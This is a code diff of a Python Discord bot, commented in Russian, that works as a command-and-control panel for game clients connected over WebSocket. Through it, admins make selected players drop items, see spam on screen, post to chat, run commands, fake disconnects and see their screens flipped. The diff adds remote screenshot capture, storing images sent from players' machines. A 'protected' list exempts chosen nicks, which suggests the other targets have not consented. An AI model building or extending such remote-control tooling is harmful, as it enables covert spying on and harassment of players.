@@ -1,8 +1,8 @@
 import os
-import io
-import base64
 import asyncio
 import json
+import io
+import base64
 import discord
 from discord.ext import commands
 import websockets
@@ -42,6 +42,9 @@ def is_admin(user_id: int) -> bool:
 def is_protected(nick: str) -> bool:
     return nick.lower() in {n.lower() for n in config["protected_nicks"]}
 
+# Хранилище скриншотов: [{nick, timestamp, data}]
+screenshots: list[dict] = []
+
 # ── Discord бот ───────────────────────────────────────────────────────────────
 
 intents = discord.Intents.default()
@@ -67,6 +70,11 @@ def make_embed(players: dict) -> discord.Embed:
     return embed
 
 
+async def send_temp(interaction: discord.Interaction, content: str, ephemeral: bool = False):
+    """Отправить обычное сообщение, которое удалится через 5 сек."""
+    await interaction.response.send_message(content, delete_after=5)
+
+
 # ── Модальные окна ────────────────────────────────────────────────────────────
 
 class DropModal(discord.ui.Modal, title="Выбросить предметы"):
@@ -76,27 +84,27 @@ class DropModal(discord.ui.Modal, title="Выбросить предметы"):
     async def on_submit(self, interaction: discord.Interaction):
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True); return
+            await send_temp(interaction, "❌ Игрок не выбран!"); return
         if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
+            await send_temp(interaction, f"🛡️ `{player}` защищён!"); return
         slot_val = self.slot.value.strip().lower()
         amount_val = self.amount.value.strip().lower()
         if slot_val != "all":
             try:
                 s = int(slot_val)
                 if not 0 <= s <= 35:
-                    await interaction.response.send_message("❌ Слот 0-35!", ephemeral=True); return
+                    await send_temp(interaction, "❌ Слот 0-35!"); return
             except ValueError:
-                await interaction.response.send_message("❌ Неверный слот!", ephemeral=True); return
+                await send_temp(interaction, "❌ Неверный слот!"); return
         if amount_val != "all":
             try:
                 a = int(amount_val)
                 if not 1 <= a <= 64:
-                    await interaction.response.send_message("❌ Количество 1-64!", ephemeral=True); return
+                    await send_temp(interaction, "❌ Количество 1-64!"); return
             except ValueError:
-                await interaction.response.send_message("❌ Неверное количество!", ephemeral=True); return
+                await send_temp(interaction, "❌ Неверное количество!"); return
         await connected_players[player]["ws"].send(f"drop:{slot_val}:{amount_val}")
-        await interaction.response.send_message(f"✅ Выброс → `{player}` слот {slot_val} x{amount_val}", ephemeral=True)
+        await send_temp(interaction, f"✅ Выброс → `{player}` слот {slot_val} x{amount_val}")
 
 
 class SpamModal(discord.ui.Modal, title="Спам на экране"):
@@ -106,17 +114,17 @@ class SpamModal(discord.ui.Modal, title="Спам на экране"):
     async def on_submit(self, interaction: discord.Interaction):
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True); return
+            await send_temp(interaction, "❌ Игрок не выбран!"); return
         if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
+            await send_temp(interaction, f"🛡️ `{player}` защищён!"); return
         try:
             c = int(self.count.value.strip())
             if not 1 <= c <= 30:
-                await interaction.response.send_message("❌ Повторений 1-30!", ephemeral=True); return
+                await send_temp(interaction, "❌ Повторений 1-30!"); return
         except ValueError:
-            await interaction.response.send_message("❌ Неверное число!", ephemeral=True); return
+            await send_temp(interaction, "❌ Неверное число!"); return
         await connected_players[player]["ws"].send(f"spam:{self.message.value}:{c}")
-        await interaction.response.send_message(f"✅ Спам → `{player}` | `{self.message.value}` x{c}", ephemeral=True)
+        await send_temp(interaction, f"✅ Спам → `{player}` | `{self.message.value}` x{c}")
 
 
 class ChatModal(discord.ui.Modal, title="Написать в чат"):
@@ -125,11 +133,11 @@ class ChatModal(discord.ui.Modal, title="Написать в чат"):
     async def on_submit(self, interaction: discord.Interaction):
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True); return
+            await send_temp(interaction, "❌ Игрок не выбран!"); return
         if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
+            await send_temp(interaction, f"🛡️ `{player}` защищён!"); return
         await connected_players[player]["ws"].send(f"chat:{self.message.value}")
-        await interaction.response.send_message(f"✅ Чат → `{player}`: `{self.message.value}`", ephemeral=True)
+        await send_temp(interaction, f"✅ Чат → `{player}`: `{self.message.value}`")
 
 
 class CommandModal(discord.ui.Modal, title="Выполнить команду"):
@@ -138,11 +146,11 @@ class CommandModal(discord.ui.Modal, title="Выполнить команду"):
     async def on_submit(self, interaction: discord.Interaction):
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True); return
+            await send_temp(interaction, "❌ Игрок не выбран!"); return
         if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
+            await send_temp(interaction, f"🛡️ `{player}` защищён!"); return
         await connected_players[player]["ws"].send(f"cmd:{self.command.value}")
-        await interaction.response.send_message(f"✅ Команда → `{player}`: `/{self.command.value}`", ephemeral=True)
+        await send_temp(interaction, f"✅ Команда → `{player}`: `/{self.command.value}`")
 
 
 # ── Select игрока ─────────────────────────────────────────────────────────────
@@ -157,36 +165,92 @@ class PlayerSelect(discord.ui.Select):
 
     async def callback(self, interaction: discord.Interaction):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ У тебя нет доступа к панели!", ephemeral=True); return
+            await send_temp(interaction, "❌ У тебя нет доступа к панели!"); return
         bot.selected_player = self.values[0]
         nick = self.values[0]
         if is_protected(nick):
-            await interaction.response.send_message(f"🛡️ `{nick}` защищён от троллинга!", ephemeral=True)
+            await send_temp(interaction, f"🛡️ `{nick}` защищён от троллинга!")
         else:
-            await interaction.response.send_message(f"✅ Выбран: `{nick}`", ephemeral=True)
+            await send_temp(interaction, f"✅ Выбран: `{nick}`")
 
 
-# ── Меню эффектов (открывается по кнопке "😈 Троллинг") ──────────────────────
+# ── Вкладка скриншотов ────────────────────────────────────────────────────────
+
+class ScreenshotsView(discord.ui.View):
+    def __init__(self, page: int = 0):
+        super().__init__(timeout=60)
+        self.page = page
+
+    def make_embed(self) -> discord.Embed:
+        embed = discord.Embed(title="📸 Скриншоты", color=0x3498DB)
+        if not screenshots:
+            embed.description = "Скриншотов пока нет."
+        else:
+            total = len(screenshots)
+            embed.set_footer(text=f"Скриншот {self.page + 1} из {total}")
+            ss = screenshots[self.page]
+            embed.add_field(name="Игрок", value=f"`{ss['nick']}`", inline=True)
+            embed.add_field(name="Время", value=ss["time"], inline=True)
+        return embed
+
+    def get_file(self):
+        if not screenshots:
+            return None
+        ss = screenshots[self.page]
+        img_bytes = base64.b64decode(ss["data"])
+        return discord.File(io.BytesIO(img_bytes), filename=f"screenshot_{ss['nick']}.png")
+
+    @discord.ui.button(label="◀️", style=discord.ButtonStyle.secondary, row=0)
+    async def prev(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not is_admin(interaction.user.id):
+            await send_temp(interaction, "❌ Нет доступа!"); return
+        if self.page > 0:
+            self.page -= 1
+        f = self.get_file()
+        if f:
+            await interaction.response.send_message(embed=self.make_embed(), file=f, view=ScreenshotsView(self.page), delete_after=60)
+        else:
+            await interaction.response.send_message(embed=self.make_embed(), view=ScreenshotsView(self.page), delete_after=60)
+
+    @discord.ui.button(label="▶️", style=discord.ButtonStyle.secondary, row=0)
+    async def next(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not is_admin(interaction.user.id):
+            await send_temp(interaction, "❌ Нет доступа!"); return
+        if self.page < len(screenshots) - 1:
+            self.page += 1
+        f = self.get_file()
+        if f:
+            await interaction.response.send_message(embed=self.make_embed(), file=f, view=ScreenshotsView(self.page), delete_after=60)
+        else:
+            await interaction.response.send_message(embed=self.make_embed(), view=ScreenshotsView(self.page), delete_after=60)
+
+    @discord.ui.button(label="🗑️ Очистить все", style=discord.ButtonStyle.danger, row=0)
+    async def clear(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not is_owner(interaction.user.id):
+            await send_temp(interaction, "❌ Только владелец!"); return
+        screenshots.clear()
+        await send_temp(interaction, "✅ Скриншоты очищены.")
+
+
+# ── Меню эффектов ─────────────────────────────────────────────────────────────
 
 class TrollEffectsView(discord.ui.View):
-    """Отдельное меню с визуальными эффектами."""
-
     def __init__(self):
         super().__init__(timeout=60)
 
     async def send_effect(self, interaction: discord.Interaction, cmd: str, label: str):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
+            await send_temp(interaction, "❌ Нет доступа!"); return
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Сначала выбери игрока в главной панели!", ephemeral=True); return
+            await send_temp(interaction, "❌ Сначала выбери игрока в главной панели!"); return
         if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
+            await send_temp(interaction, f"🛡️ `{player}` защищён!"); return
         try:
             await connected_players[player]["ws"].send(cmd)
-            await interaction.response.send_message(f"✅ `{label}` → `{player}`", ephemeral=True)
+            await send_temp(interaction, f"✅ `{label}` → `{player}`")
         except Exception as e:
-            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
+            await send_temp(interaction, f"❌ Ошибка: {e}")
 
     @discord.ui.button(label="🙃 Перевернуть экран", style=discord.ButtonStyle.danger, row=0)
     async def flip(self, interaction, button):
@@ -208,15 +272,6 @@ class TrollEffectsView(discord.ui.View):
     async def shake(self, interaction, button):
         await self.send_effect(interaction, "shake", "Тряска экрана на 5с")
 
-    @discord.ui.button(label="◀️ Назад к панели", style=discord.ButtonStyle.secondary, row=2)
-    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
-        await interaction.response.send_message(
-            "↩️ Используй главную панель выше.",
-            ephemeral=True
-        )
-
 
 # ── Главная панель ────────────────────────────────────────────────────────────
 
@@ -227,19 +282,18 @@ class TrollView(discord.ui.View):
 
     async def send_cmd(self, interaction: discord.Interaction, cmd: str, label: str):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True); return
+            await send_temp(interaction, "❌ У тебя нет доступа!"); return
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True); return
+            await send_temp(interaction, "❌ Сначала выбери игрока!"); return
         if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён от троллинга!", ephemeral=True); return
+            await send_temp(interaction, f"🛡️ `{player}` защищён от троллинга!"); return
         try:
             await connected_players[player]["ws"].send(cmd)
-            await interaction.response.send_message(f"✅ `{label}` → `{player}`", ephemeral=True)
+            await send_temp(interaction, f"✅ `{label}` → `{player}`")
         except Exception as e:
-            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
+            await send_temp(interaction, f"❌ Ошибка: {e}")
 
-    # row=1
     @discord.ui.button(label="🔀 Перемешать инвентарь", style=discord.ButtonStyle.danger, row=1)
     async def shuffle(self, interaction, button):
         await self.send_cmd(interaction, "shuffle", "Инвентарь перемешан")
@@ -252,24 +306,22 @@ class TrollView(discord.ui.View):
     async def restore(self, interaction, button):
         await self.send_cmd(interaction, "restore", "Управление восстановлено")
 
-    # row=2
     @discord.ui.button(label="📦 Выбросить предметы...", style=discord.ButtonStyle.danger, row=2)
     async def drop(self, interaction, button):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
+            await send_temp(interaction, "❌ Нет доступа!"); return
         await interaction.response.send_modal(DropModal())
 
     @discord.ui.button(label="💬 Спам на экране...", style=discord.ButtonStyle.primary, row=2)
     async def spam(self, interaction, button):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
+            await send_temp(interaction, "❌ Нет доступа!"); return
         await interaction.response.send_modal(SpamModal())
 
     @discord.ui.button(label="📡 Фейк-дисконнект", style=discord.ButtonStyle.secondary, row=2)
     async def fakedisco(self, interaction, button):
         await self.send_cmd(interaction, "fakedisco", "Фейк-дисконнект")
 
-    # row=3
     @discord.ui.button(label="🍌 Бананчик", style=discord.ButtonStyle.danger, row=3)
     async def banana(self, interaction, button):
         await self.send_cmd(interaction, "banana", "Бананчик запущен")
@@ -281,68 +333,71 @@ class TrollView(discord.ui.View):
     @discord.ui.button(label="💬 Написать в чат...", style=discord.ButtonStyle.secondary, row=3)
     async def chat(self, interaction, button):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
+            await send_temp(interaction, "❌ Нет доступа!"); return
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True); return
+            await send_temp(interaction, "❌ Сначала выбери игрока!"); return
         if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
+            await send_temp(interaction, f"🛡️ `{player}` защищён!"); return
         await interaction.response.send_modal(ChatModal())
 
     @discord.ui.button(label="⌨️ Выполнить команду...", style=discord.ButtonStyle.danger, row=3)
     async def command(self, interaction, button):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
+            await send_temp(interaction, "❌ Нет доступа!"); return
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True); return
+            await send_temp(interaction, "❌ Сначала выбери игрока!"); return
         if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
+            await send_temp(interaction, f"🛡️ `{player}` защищён!"); return
         await interaction.response.send_modal(CommandModal())
 
-    # row=4
+    @discord.ui.button(label="📸 Скриншот", style=discord.ButtonStyle.secondary, row=4)
+    async def screenshot(self, interaction, button):
+        if not is_admin(interaction.user.id):
+            await send_temp(interaction, "❌ Нет доступа!"); return
+        player = getattr(bot, "selected_player", None)
+        if not player or player not in connected_players:
+            await send_temp(interaction, "❌ Сначала выбери игрока!"); return
+        if is_protected(player):
+            await send_temp(interaction, f"🛡️ `{player}` защищён!"); return
+        await connected_players[player]["ws"].send("screenshot")
+        await send_temp(interaction, f"📸 Скриншот запрошен у `{player}` — скоро появится во вкладке 📁")
+
+    @discord.ui.button(label="📁 Скриншоты", style=discord.ButtonStyle.primary, row=4)
+    async def screenshots_tab(self, interaction, button):
+        if not is_admin(interaction.user.id):
+            await send_temp(interaction, "❌ Нет доступа!"); return
+        view = ScreenshotsView(page=len(screenshots) - 1 if screenshots else 0)
+        f = view.get_file()
+        if f:
+            await interaction.response.send_message(embed=view.make_embed(), file=f, view=view, delete_after=120)
+        else:
+            await interaction.response.send_message(embed=view.make_embed(), view=view, delete_after=120)
+
     @discord.ui.button(label="😈 Троллинг", style=discord.ButtonStyle.danger, row=4)
     async def troll_effects(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
+            await send_temp(interaction, "❌ Нет доступа!"); return
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True); return
+            await send_temp(interaction, "❌ Сначала выбери игрока!"); return
         if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
-        embed = discord.Embed(
-            title=f"😈 Эффекты троллинга → {player}",
-            description="Выбери эффект:",
-            color=0x9B59B6
-        )
-        await interaction.response.send_message(embed=embed, view=TrollEffectsView(), ephemeral=True)
-
-    @discord.ui.button(label="📸 Скриншот", style=discord.ButtonStyle.secondary, row=3)
-    async def screenshot(self, interaction, button):
-        if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True)
-            return
-        player = getattr(bot, "selected_player", None)
-        if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True)
-            return
-        try:
-            await connected_players[player]["ws"].send("screenshot")
-            await interaction.response.send_message(f"📸 Скриншот запрошен у `{player}` — придёт в личку", ephemeral=True)
-        except Exception as e:
-            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
+            await send_temp(interaction, f"🛡️ `{player}` защищён!"); return
+        embed = discord.Embed(title=f"😈 Эффекты троллинга → {player}", color=0x9B59B6)
+        await interaction.response.send_message(embed=embed, view=TrollEffectsView(), delete_after=120)
 
     @discord.ui.button(label="🔄 Обновить список", style=discord.ButtonStyle.success, row=4)
     async def refresh(self, interaction, button):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
+            await send_temp(interaction, "❌ Нет доступа!"); return
         await interaction.response.edit_message(
             embed=make_embed(connected_players),
             view=TrollView()
         )
 
 
-# ── WebSocket сервер ──────────────────────────────────────────────────────────
+# ── WebSocket ─────────────────────────────────────────────────────────────────
 
 async def update_panel():
     global troll_message
@@ -380,6 +435,21 @@ async def ws_handler(ws):
             elif msg_type == "server" and nick in connected_players:
                 connected_players[nick]["server"] = data["server"]
                 await update_panel()
+
+            elif msg_type == "screenshot":
+                # Сохраняем скриншот в хранилище
+                from datetime import datetime
+                img_data = data.get("data", "")
+                if img_data and nick:
+                    screenshots.append({
+                        "nick": nick,
+                        "time": datetime.now().strftime("%d.%m %H:%M:%S"),
+                        "data": img_data
+                    })
+                    # Держим только последние 20 скриншотов
+                    if len(screenshots) > 20:
+                        screenshots.pop(0)
+                    print(f"[WS] Скриншот от {nick} сохранён ({len(screenshots)} всего)")
 
     except Exception as e:
         print(f"[WS] Ошибка: {e}")
